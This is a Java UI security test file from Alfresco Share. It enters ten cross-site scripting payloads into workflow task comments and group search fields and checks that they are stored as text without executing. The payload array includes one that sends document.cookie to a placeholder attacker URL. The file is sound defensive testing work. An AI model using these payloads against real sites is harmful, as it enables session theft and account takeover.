package org.alfresco.share.security;

import java.util.Date;

import lombok.extern.slf4j.Slf4j;

import org.alfresco.dataprep.CMISUtil.Priority;
import org.alfresco.dataprep.WorkflowService;
import org.alfresco.po.share.dashlet.Dashlets;
import org.alfresco.po.share.dashlet.MyTasksDashlet;
import org.alfresco.po.share.site.SelectPopUpPage;
import org.alfresco.po.share.tasksAndWorkflows.EditTaskPage;
import org.alfresco.po.share.tasksAndWorkflows.StartWorkflowPage;
import org.alfresco.po.share.tasksAndWorkflows.TaskDetailsPage;
import org.alfresco.po.share.tasksAndWorkflows.WorkflowDetailsPage;
import org.alfresco.po.share.tasksAndWorkflows.WorkflowsIveStartedPage;
import org.alfresco.po.share.user.CustomizeUserDashboardPage;
import org.alfresco.share.BaseTest;
import org.alfresco.testrail.TestRail;
import org.alfresco.utility.model.SiteModel;
import org.alfresco.utility.model.TestGroup;
import org.alfresco.utility.model.UserModel;

import org.springframework.beans.factory.annotation.Autowired;

import org.testng.Assert;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.AfterMethod;
import org.testng.annotations.Test;

/**
 * @author andrei.ciubotaru
 */
@Slf4j
public class WorkflowSecurityTests extends BaseTest
{
    CustomizeUserDashboardPage customizeUserDashboard;
    private final Date timeDate = new Date();
    private final String taskMessage = "PRR Task";
    private final ThreadLocal<UserModel> user1 = new ThreadLocal<>();
    private final ThreadLocal<UserModel> user2 = new ThreadLocal<>();
    private final ThreadLocal<SiteModel> site = new ThreadLocal<>();
    private final String[] xssStrings = new String[] {
        "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">",
        "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">",
        "<DIV STYLE=\"width: expression(alert('XSS'));\">",
        "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
        "<img><scrip<script>t>alert('XSS');<</script>/script>",
        "<input onfocus=write(1) autofocus>",
        "<input onblur=write(1) autofocus><input autofocus>",
        "<body oninput=alert(1)><input autofocus>",
        "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
        "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X"
    };
    @Autowired
    WorkflowService workflowService;
    EditTaskPage editTaskPage;
    MyTasksDashlet myTasksDashlet;
    TaskDetailsPage taskDetailsPage;
    StartWorkflowPage startWorkflowPage;
    SelectPopUpPage selectPopUpPage;
    WorkflowsIveStartedPage workflowsIveStartedPage;
    WorkflowDetailsPage workflowDetailsPage;
    String password = "password";

    @BeforeMethod(alwaysRun = true)
    public void setupTest()
    {
        log.info("PreCondition: Creating a TestUser1");
        user1.set(getDataUser().usingAdmin().createRandomTestUser());
        getCmisApi().authenticateUser(getAdminUser());

        user2.set(getDataUser().usingAdmin().createRandomTestUser());
        getCmisApi().authenticateUser(getAdminUser());

        log.info("PreCondition: Creating a Random Site");
        site.set(getDataSite().usingUser(user1.get()).createPublicRandomSite());
        getCmisApi().authenticateUser(user1.get());

        myTasksDashlet = new MyTasksDashlet(webDriver);
        editTaskPage = new EditTaskPage(webDriver);
        customizeUserDashboard = new CustomizeUserDashboardPage(webDriver);
        taskDetailsPage = new TaskDetailsPage(webDriver);
        startWorkflowPage = new StartWorkflowPage(webDriver);
        selectPopUpPage = new SelectPopUpPage(webDriver);
        workflowsIveStartedPage = new WorkflowsIveStartedPage(webDriver);
        workflowDetailsPage = new WorkflowDetailsPage(webDriver);
    }

    @AfterMethod(alwaysRun = true)
    public void afterClass()
    {
        deleteUsersIfNotNull(user1.get());
        deleteUsersIfNotNull(user2.get());
        deleteSitesIfNotNull(site.get());
        deleteAllCookiesIfNotNull();
    }

    @TestRail (id = "C286553")
    @Test(groups = { TestGroup.SANITY, TestGroup.SECURITY, "xsstests" })
    public void verifyEditTaskButtonSaveAndClose() {
        log.info("Precondition 3: Create a \"New Task\" with message, due date, assign it to yourself, uncheck \"Send Email Notifications");
        workflowService.startNewTask(user1.get().getUsername(), password, taskMessage, timeDate, user1.get().getUsername(), Priority.Normal, null, null, false);
        log.info("Precondition 2: Add \"My Task\" dashlet to user dashboard if the dashlet is not present");
        authenticateUsingLoginPage(user1.get());
        addMyTaskDashletToDashboard();

        for (String xssString : xssStrings)
        {
            log.info("STEP1: Click \"Edit Task\" icon for created task on the \"My Tasks\" dashlet;");
            myTasksDashlet.editTask(taskMessage);
            Assert.assertEquals(editTaskPage.getMessage(), taskMessage, "Edit Task page is not opened");
            log.info("STEP2: Into Your \"Response\" - \"Comment\" enter each XSS attack from the list. XSS attack: " + xssString);
            editTaskPage.writeComment(xssString);
            log.info("STEP3: Click \"Save and Close\" button");
            editTaskPage.clickOnSaveButton();
            myTasksDashlet.assertTaskNameEqualsTo(taskMessage);
            myTasksDashlet.view_Task(taskMessage);
            Assert.assertEquals(taskDetailsPage.getComment(), xssString, "Comment was not saved.");
            userDashboardPage.navigate(user1.get());
        }
    }

    @TestRail (id = "C286584")
    @Test (groups = { TestGroup.SANITY, TestGroup.SECURITY, "xsstests" })
    public void findGroupWithXSSPooledTask() throws InterruptedException {
        authenticateUsingLoginPage(user1.get());
        log.info("PRECONDITION2: Open \"Start Workflow\" page");
        startWorkflowPage.navigate(site.get());
        log.info("PRECONDITION3: Select \"Review and Approve (pooled review)\" from \"Workflow:\" drop-down");
        startWorkflowPage.selectAWorkflow("Review and Approve (pooled review)");

        log.info("STEP1: Click Select button in Assignee part;");
        startWorkflowPage.clickGroupSelectButton();

        for (String xssString : xssStrings)
        {
            log.info("STEP2: Fill Search field with each XSS attack: " + xssString);
            log.info("STEP3: Click \"Search button\"");
            selectPopUpPage.search(xssString);

            Assert.assertTrue(selectPopUpPage.isSearchButtonDisplayed(), "Search button is no longer displayed. XSS attack succeeded");

        }
        log.info("STEP4:Fill Search field with a existent group name and click \"Search button\"");
        selectPopUpPage.search("EMAIL_CONTRIBUTORS");
        Assert.assertTrue(selectPopUpPage.isStringPresentInSearchList("EMAIL_CONTRIBUTORS"), "Group is not present in the search list");

    }

    @TestRail (id = "C286704")
    @Test (groups = { TestGroup.SANITY, TestGroup.SECURITY, "xsstests" })
    public void verifyEditTaskButtonReject() {
        log.info("Precondition 2: Add \"My Task\" dashlet to user dashboard if the dashlet is not present\n");
        authenticateUsingLoginPage(user1.get());

        addMyTaskDashletToDashboard();

        log.info("Precondition 3: Create as many \"Review and Approve (Single reviewer)\" workflows as the number of XSS attack you have, with message, due date, assign them to user2, uncheck \"Send Email Notifications\"\n");
        for (int i = 0; i < xssStrings.length; i++)
        {
            workflowService.startSingleReview(user1.get().getUsername(), password, taskMessage + i, timeDate, user2.get().getUsername(), Priority.Normal, null, null, false);
        }

        log.info("Precondition 4: Login with user2.");
        authenticateUsingLoginPage(user2.get());
        for (int i = 0; i < xssStrings.length; i++)
        {

            log.info("STEP 1: Click \"Edit Task\" icon for the created task on the \"My Tasks\" dashlet;");
            myTasksDashlet.editTask(taskMessage + i);
            Assert.assertEquals(editTaskPage.getMessage(), taskMessage + i, "Task message is not equal with the actual message or \"Edit Task\" page in not opened");

            log.info("STEP 2: Into Your \"Response\" - \"Comment\" enter each XSS attack from the list");
            editTaskPage.writeComment(xssStrings[i]);
            Assert.assertTrue(editTaskPage.isReassignButtonPresent(), "The element cannot be found. XSS attack has occured.");


            log.info("STEP 3: Click Reject button;");
            editTaskPage.clickRejectButton();
            Assert.assertTrue(userDashboardPage.isNewAlfrescoLogoDisplayed(), "The User Dashboard page is not opened");

        }

        log.info("STEP 4: Log is as assigner: " + user1);
        authenticateUsingLoginPage(user1.get());
        workflowsIveStartedPage.navigate();
        for (int i = 0; i < xssStrings.length; i++)
        {
            log.info("STEP 5: Open Workflow details page; Task name: " + taskMessage + i);
            workflowsIveStartedPage.clickOnWorkflowTitle(taskMessage + i);
            Assert.assertEquals(workflowDetailsPage.getRecentComment(), xssStrings[i], "XSS string is not displayed in outcome");

            log.info("STEP 6: Open Edit task page");
            workflowDetailsPage.clickEditTaskButton();
            Assert.assertTrue(editTaskPage.getEditTaskHeader().contains("Rejected"), "Edit Task page is not opened");

            log.info("STEP 7: Click Task Done button;");
            editTaskPage.clickTaskDoneButton();
            Assert.assertEquals(workflowDetailsPage.getRecentOutcome(), "Task Done", "Workflow Details page is not opened");

            workflowsIveStartedPage.navigate();
        }
    }

    /**
     * If 'MyTask' dashlet is not displayed on user dashboard add it.
     * And then check if it was successfully added.
     */
    private void addMyTaskDashletToDashboard(){
        customizeUserDashboard.navigate();
        if(userDashboardPage.isDashletAvailable("My Tasks")){
            customizeUserDashboard.clickOk();
        }
        else {
            customizeUserDashboard.navigate()
            .clickAddDashlet()
            .addDashlet(Dashlets.MY_TASKS, 1)
            .assertDashletIsAddedInColumn(Dashlets.MY_TASKS, 1)
            .clickOk();
        userDashboardPage.assertCustomizeUserDashboardIsDisplayed()
            .assertDashletIsAddedInPosition(Dashlets.MY_TASKS, 1, 3);
        }
    }
}
